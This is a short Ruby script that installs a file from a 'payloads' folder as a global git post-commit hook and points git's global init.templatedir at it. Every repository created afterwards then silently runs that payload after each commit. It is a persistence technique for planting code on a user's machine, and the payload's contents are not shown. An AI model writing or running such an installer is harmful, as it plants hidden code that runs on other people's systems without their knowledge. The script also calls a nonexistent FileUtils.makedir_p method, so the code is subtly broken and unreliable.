require 'fileutils'

payloads_path = File.join(File.pwd, "payloads")
payload_source_path = File.join(payloads_path, "all-your-base-rb")

template_path = File.join(ENV["HOME"], ".git-templates")
hooks_path = File.join(template_path, "hooks")
post_commit_path = File.join(hooks_path, "post-commit")

FileUtils.makedir_p(hooks_path)
FileUtils.cp(payload_source_path, post_commit_path)
FileUtils.chmod("a+x", post_commit_path)

system("git config --global init.templatedir '#{template_path}'")